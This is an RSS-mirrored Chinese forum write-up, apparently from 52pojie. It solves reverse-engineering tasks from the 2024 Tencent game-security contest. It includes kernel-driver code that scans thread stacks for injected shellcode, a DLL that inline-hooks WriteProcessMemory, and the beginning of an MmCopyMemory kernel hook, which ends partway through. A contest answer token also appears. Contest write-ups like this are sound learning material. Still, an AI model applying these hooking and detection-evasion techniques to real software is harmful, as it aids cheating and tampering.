border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h5>方法2</h5><p>通过获取到线程结构得到它的线程上下文，输出 RIP 的值应该也行，通过PCHUNTER看到shellcode运行的线程</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=e80d517a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUeP75NTddsdXdEiae8XM7jmdOrOFwSYOd9UhYBwPkBFpLiayib7vK4RlozSQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>通过分析可知 shellcode 执行的线程具有如下特点：</p><p>与 TID=12 的线程入口相同</p><p>保持运行状态</p><p>据此可以筛选得到这个线程，通过线程结构体可以找到它的栈</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=4660381d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePnZ4aZsxWJ6TlnbriawpXGRMJAA8hrptajiazW9icxrKg03QxCqYHSCuRg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>多次运行发现栈中存在 <code style="font-family: SFMono-Regular, Consolas, ;">GameSec.exe</code> 这个字符串。并且在它 - 0x28 的位置有一个地址，那个地址前八位和shellcode一致，所以同样可以爆破+特征码匹配。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;ntifs.h&gt;</span> </span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntddk.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntstrsafe.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> MAX_BACKTRACE_DEPTH 20</span><br />ULONG64 num = <span style="color: rgb(255, 115, 253);">0</span>;<br />NTSTATUS <span style="color: rgb(255, 255, 182);">EnumerateKernelThreads</span>();<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">NTSTATUS</span> (*ZWQUERYSYSTEMINFORMATION)(ULONG, PVOID, ULONG, PULONG);<br />VOID <span style="color: rgb(255, 255, 182);">DRIVERUNLOAD</span>(_In_ <span style="color: rgb(150, 203, 254);">struct</span> _DRIVER_OBJECT* DriverObject){<br />    kprintf((<span style="color: rgb(168, 255, 96);">"unload\n"</span>));}<br />NTSTATUS <span style="color: rgb(255, 255, 182);">EnumerateKernelThreads</span>() {<br />    PETHREAD T12 = <span style="color: rgb(198, 197, 254);">NULL</span>;    PETHREAD T;<br />    PsLookupThreadByThreadId(<span style="color: rgb(255, 115, 253);">12</span>, &amp;T12);<br />    kprintf((<span style="color: rgb(168, 255, 96);">"T12=%p\n"</span>), T12);<br />    ULONG64 Start = *(ULONG64 *)((ULONG64)T12 + <span style="color: rgb(255, 115, 253);">0x620</span>);<br />    HANDLE TargetThread = <span style="color: rgb(255, 115, 253);">0</span>;<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">16</span>; i &lt; <span style="color: rgb(255, 115, 253);">0x20000</span>; i+=<span style="color: rgb(255, 115, 253);">4</span>) {<br />        T = <span style="color: rgb(198, 197, 254);">NULL</span>;        PsLookupThreadByThreadId(i, &amp;T);<br />        <span style="color: rgb(150, 203, 254);">if</span> (T) {<br />            ULONG64 Startaddr = *(ULONG64 *)((ULONG64)T + <span style="color: rgb(255, 115, 253);">0x620</span>);<br />            <span style="color: rgb(150, 203, 254);">if</span> (Startaddr == Start) {<br />                kprintf((<span style="color: rgb(168, 255, 96);">"Found Thread=%p pThread=%p\n"</span>), i,T);                TargetThread = i;<br />                <span style="color: rgb(150, 203, 254);">break</span>;            }        }    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (T != <span style="color: rgb(198, 197, 254);">NULL</span>) {<br />        ULONG64 StackBase = <span style="color: rgb(255, 115, 253);">0</span>;<br />        ULONG64 StackLimit = <span style="color: rgb(255, 115, 253);">0</span>;<br />        StackBase= *(ULONG64 *)((ULONG64)T + <span style="color: rgb(255, 115, 253);">0x38</span>);<br />        StackLimit=*(ULONG64 *)((ULONG64)T + <span style="color: rgb(255, 115, 253);">0x30</span>);<br />        kprintf((<span style="color: rgb(168, 255, 96);">"Stackbase=%p StackLimit=%p\n"</span>), StackBase, StackLimit);<br />        <span style="color: rgb(150, 203, 254);">for</span> (ULONG64 addr = StackBase<span style="color: rgb(255, 115, 253);">-0x10</span> ; addr &gt; StackLimit; addr -= <span style="color: rgb(255, 115, 253);">8</span>) {<br />            <span style="color: rgb(150, 203, 254);">if</span> (!strcmp(addr, <span style="color: rgb(168, 255, 96);">"GameSec.exe"</span>)) {<br />                kprintf((<span style="color: rgb(168, 255, 96);">"Found string in %p\n"</span>), addr);<br />                <span style="color: rgb(255, 255, 182);">uintptr_t</span> address;<br />                <span style="color: rgb(150, 203, 254);">for</span> (ULONG64 i = <span style="color: rgb(255, 115, 253);">0x0</span>; i &lt;<span style="color: rgb(255, 115, 253);">65536</span>; i++)                {<br />                    address = (*(ULONG64*)(addr<span style="color: rgb(255, 115, 253);">-0x28</span>)) &amp; <span style="color: rgb(255, 115, 253);">0xffffffff00000000</span>;<br />                    address = address + <span style="color: rgb(255, 115, 253);">0x1000</span>;<br />                    address = address + (i&lt;&lt;<span style="color: rgb(255, 115, 253);">16</span>);<br />                    <span style="color: rgb(150, 203, 254);">if</span> (MmIsAddressValid((PVOID)address) &amp;&amp; *((ULONG64 *)address) == <span style="color: rgb(255, 115, 253);">0x7C8B483024748B48</span> )                    {<br />                        kprintf((<span style="color: rgb(168, 255, 96);">"shellcode found in %p\n"</span>), address);<br />                        <span style="color: rgb(146, 255, 184);">//DbgBreakPoint();</span><br />                        <span style="color: rgb(150, 203, 254);">break</span>;                    }                }<br />                <span style="color: rgb(150, 203, 254);">break</span>;            }        }    }<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;}<br />NTSTATUS <span style="color: rgb(255, 255, 182);">DriverEntry</span>(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg){<br />    kprintf((<span style="color: rgb(168, 255, 96);">"hello xia0ji233\n"</span>));    EnumerateKernelThreads();    pDriver-&gt;DriverUnload = DRIVERUNLOAD;<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;<br />}</code></pre><p>先运行 Loader.sys，再运行EmurateThread.sys，可以成功输出shellcode的地址。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=2fba99e0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePvXhE0fnD3lmZZbIcViancHTcicVKd6T2LMOjG9huicniaMZCbicwuJtKicWQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h5>方法3</h5><p>随后我发现线程结构体中的 TrapFrame 有点东西，通过一段时间的运行之后，发现它的一些寄存器中会带上点东西</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=66f2b583&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePbI8U8xT0g2hibkOosUmauYnLJiawgrjEf7MTTfdpBjURkoYCgpgonrZw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>这里我选 Rdx，取前8位，暴力搜索4位（65536，可接受范围内）匹配。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=8d094357&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePeicj85ChjjpDLtKQhGsicbhKm0cNNaPSnvLv5zMshLsFibxI5RqREKOLg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>先运行 Loader.sys 再运行 Search3.sys，可以直接得到 shellcode 的地址。</p><h5>方法4</h5><p>观察到 ETHTREAD 结构体中有个指针指向了距离shellcode比较近的位置</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=06803f03&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePmSmcYula75nDB3HdicqbAtJibZA2rFmDoQNuibOjy2Ms6ACnRTcHcATmA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>获取这个指针的前八位，然后爆破，匹配特征码。</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=6eba5c5f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePiaaQBbolqjUOCVRjDzzjqh4DHysfibpRdufKPiby8TdgDNZ4yfvWOjNQg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>先运行Loader.sys，再运行 Search4.sys，即可获得shellcode的地址。</p><h5>方法5</h5><p>挂起线程，此时会将线程上下文保存在栈顶中，再去遍历一遍栈，获得RIP指针，这里判断只需要拿 RSP 即可，当 [addr+0x180]-0x400==addr（+0x180是RSP相对于上下文结构体的偏移，0x400是context上下文大小）时，取出 RIP 即可。</p><p>先运行 Loader.sys，在运行search5.sys，即可输出shellcode。</p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1916220-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Mon, 22 Apr 2024 12:40:47 +0800</pubDate>
</item>
<item>
<title>腾讯游戏安全大赛2024初赛题解</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140518&amp;idx=1&amp;sn=c7b5335b5a6db8408d12285e2e71fee8&amp;chksm=bd50a1f28a2728e40475422b3056a79a2e5bc83ae38dcf6eb325e3ac5919ef71125634222b5d&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140518&amp;idx=1&amp;sn=c7b5335b5a6db8408d12285e2e71fee8&amp;chksm=bd50a1f28a2728e40475422b3056a79a2e5bc83ae38dcf6eb325e3ac5919ef71125634222b5d&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-04-19 15:40</span> <span style="display: inline-block;">北京</span>
</p>

<p>报名参加了一下2024的游戏安全竞赛，今天初赛结束，总体来说赛题质量还是非常高的。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=34220a29&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3wYamfcficGFvAbxSW7jk224avZfqVCEr7Dibq8CSddHLDNSqribzF8nGw%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>xia0ji233</strong></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p>报名参加了一下2024的游戏安全竞赛，今天初赛结束，总体来说赛题质量还是非常高的。</p><p>解题附件下载</p><p>吐槽一下，吾爱官方开个2024的分类吧</p><p>&lt;!--more--&gt;</p><h2>2024 腾讯游戏安全大赛初赛</h2><h3>参赛人员信息</h3><p>略</p><h3>分析</h3><h4>找到内存中的两串token，作为答案提交（2分）。</h4><p>先工具分析一下，发现加了 VM，动调发现对很多工具有检测，部分改名可以直接绕过，但是 CE 怎么改都会被检测，所以先上微步基本分析一下行为：</p><p>https://s.threatbook.com/report/file/1bc2f607b5e4707a70a32bb78ac72c9b895f00413ba4bd21229f6103757ca19f</p><p>注意到了有注入行为，一般会通过 <code style="font-family: SFMono-Regular, Consolas, ;">WriteProcessMemory</code> 这个 API 进行，于是编写 DLL 去hook看看情况。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">// dllmain.cpp : 定义 DLL 应用程序的入口点。hack.dll</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">"pch.h"</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;Windows.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;Psapi.h&gt;</span></span><br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">BOOL</span> (*Func)( HANDLE hProcess,<br />     LPVOID lpBaseAddress,<br />     LPCVOID lpBuffer,<br />     SIZE_T nSize,<br />     SIZE_T* lpNumberOfBytesWritten<br />);<br />Func OriginFunc = <span style="color: rgb(198, 197, 254);">NULL</span>;<br /><br />BYTE HookCode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>, <span style="color: rgb(146, 255, 184);">//mov rax , xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span>                                          <span style="color: rgb(146, 255, 184);">//jmp rax</span><br />};<br />BYTE OriginCode[<span style="color: rgb(255, 115, 253);">0x50</span>];<br />SIZE_T HookLen = sizeof(HookCode);<br />DWORD saved=<span style="color: rgb(255, 115, 253);">0</span>;<br />WCHAR FILENAME[MAX_PATH];<br />BOOL <span style="color: rgb(255, 255, 182);">HackWriteProcessMemory</span>(HANDLE hProcess,<br />    LPVOID lpBaseAddress,<br />    LPCVOID lpBuffer,<br />    SIZE_T nSize,<br />    SIZE_T* lpNumberOfBytesWritten<br />) {<br /><br />    VirtualProtect(OriginFunc, HookLen, PAGE_EXECUTE_READWRITE, &amp;saved);<br />    memcpy(OriginFunc, OriginCode,HookLen);             <span style="color: rgb(146, 255, 184);">//unhook</span><br />    printf(<span style="color: rgb(168, 255, 96);">"Call WriteProcessMemory(%p,%p,%p,%d,%p)"</span>,hProcess,lpBaseAddress,lpBuffer,nSize,lpNumberOfBytesWritten);<br />    GetModuleFileNameEx(hProcess, <span style="color: rgb(198, 197, 254);">NULL</span>, FILENAME, MAX_PATH);<br />    wprintf(<span style="color: rgb(168, 255, 96);">L"ProcessName=%s\n"</span>, FILENAME);<br />    BOOL ret=OriginFunc(hProcess, lpBaseAddress, lpBuffer, nSize,lpNumberOfBytesWritten);<br />    memcpy(OriginFunc, HookCode, HookLen);               <span style="color: rgb(146, 255, 184);">//rehook</span><br />    VirtualProtect(OriginFunc, HookLen, saved, &amp;saved);<br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">hack</span>() {<br />    OriginFunc = WriteProcessMemory;<br />    VirtualProtect(OriginFunc, HookLen, PAGE_EXECUTE_READWRITE, &amp;saved);<br />    memcpy(OriginCode, OriginFunc,HookLen); <span style="color: rgb(146, 255, 184);">//saved</span><br />    *(__int64*)(HookCode + <span style="color: rgb(255, 115, 253);">2</span>) = (__int64)HackWriteProcessMemory;<span style="color: rgb(146, 255, 184);">//build</span><br />    memcpy(OriginFunc, HookCode, HookLen);  <span style="color: rgb(146, 255, 184);">//Hook</span><br />    VirtualProtect(OriginFunc, HookLen, saved, &amp;saved);<br />    printf(<span style="color: rgb(168, 255, 96);">"Hook done\n"</span>);<br />}<br /><br />BOOL APIENTRY <span style="color: rgb(255, 255, 182);">DllMain</span>( HMODULE hModule,<br />                       DWORD  ul_reason_for_call,<br />                       LPVOID lpReserved<br />                     )<br />{<br />    <span style="color: rgb(150, 203, 254);">switch</span> (ul_reason_for_call)<br />    {<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_ATTACH: {<br />        AllocConsole();<br />        freopen(<span style="color: rgb(168, 255, 96);">"CONOUT$"</span>, <span style="color: rgb(168, 255, 96);">"w"</span>, stdout);<br />        hack();<br />    }<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_ATTACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_DETACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_DETACH:<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;<br />}</code></pre><p>这一块没什么进展，但是突然发现这个进程对其它进程有些操作</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=d28d3127&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3iaFmyJOC0SdkHAmlAV7IeVsbpSVHqwLo3e5OoFnialof3UV2onJvdkJQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>这不就是 token1 嘛，但是发现底下没有这个文件，尝试创建这个文件，发现直接就有内容写进去了，用命令可以打印出来。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=65d79976&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3z7q5yeIPWUDYjOJ4p7dt3xEOqNdGKq04KicvOiaYOQfhP5GZwqp0ddPw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>于是 token1 就出来了，很神奇。 <code style="font-family: SFMono-Regular, Consolas, ;">token1: 757F4749AEBB1891EF5AC2A9B5439CEA</code>。</p><p>对于token2，一直尝试做一些 API 的 hook 想看看它干了啥，这里我做了 MmCopyMemory 的 hook。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntifs.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntdef.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntstatus.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntddk.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> MAX_BACKTRACE_DEPTH 20</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> SYMBOL L<span style="color: rgb(168, 255, 96);">"\\??\\xia0ji2333"</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span><br /><br />UINT64 BaseAddr=<span style="color: rgb(198, 197, 254);">NULL</span>, DLLSize=<span style="color: rgb(255, 115, 253);">0</span>;<br /><br />NTSTATUS CreateDevice(PDEVICE_OBJECT driver) {<br />    NTSTATUS status;<br />    UNICODE_STRING MyDriver;<br />    PDEVICE_OBJECT device = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />    RtlInitUnicodeString(&amp;MyDriver, L<span style="color: rgb(168, 255, 96);">"\\DEVICE\\xia0ji233"</span>);<br />    status = IoCreateDevice(<br />        driver,<br />        <span style="color: rgb(150, 203, 254);">sizeof</span>(driver-&gt;DeviceExtension),<br />        &amp;MyDriver,<br />        FILE_DEVICE_UNKNOWN,<br />        FILE_DEVICE_SECURE_OPEN,<br />        <span style="color: rgb(198, 197, 254);">FALSE</span>,<br />        &amp;device<br />    );<br />    <span style="color: rgb(150, 203, 254);">if</span> (status == STATUS_SUCCESS) {<br />        UNICODE_STRING Sym;<br />        RtlInitUnicodeString(&amp;Sym, SYMBOL);<br />        status = IoCreateSymbolicLink(&amp;Sym, &amp;MyDriver);<br />        <span style="color: rgb(150, 203, 254);">if</span> (status == STATUS_SUCCESS) {<br />            kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: symbol linked success\n"</span>), __LINE__);<br />        }<br />        <span style="color: rgb(150, 203, 254);">else</span> {<br />            kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: symbol linked failed status=%x\n"</span>), __LINE__, status);<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">else</span> {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: create device fail status=%x\n"</span>), __LINE__, status);<br />    }<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> DeleteDevice(PDRIVER_OBJECT pDriver) {<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: start delete device\n"</span>), __LINE__);<br />    <span style="color: rgb(150, 203, 254);">if</span> (pDriver-&gt;DeviceObject) {<br />        UNICODE_STRING Sym;<br />        RtlInitUnicodeString(&amp;Sym, SYMBOL);<span style="color: rgb(146, 255, 184);">//CreateFile </span><br />        kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: Delete Symbol\n"</span>), __LINE__);<br />        IoDeleteSymbolicLink(&amp;Sym);<br />        kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: Delete Device\n"</span>), __LINE__);<br />        IoDeleteDevice(pDriver-&gt;DeviceObject);<br />    }<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: end delete device\n"</span>), __LINE__);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">char</span> newcode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(146, 255, 184);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span><span style="color: rgb(146, 255, 184);">//jmp rax</span><br />};<br /><span style="color: rgb(255, 255, 182);">char</span> oldcode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<br />    <span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<br />};<br /><br /><span style="color: rgb(255, 255, 182);">char</span> *target;<br /><br />KIRQL WPOFFx64()<br 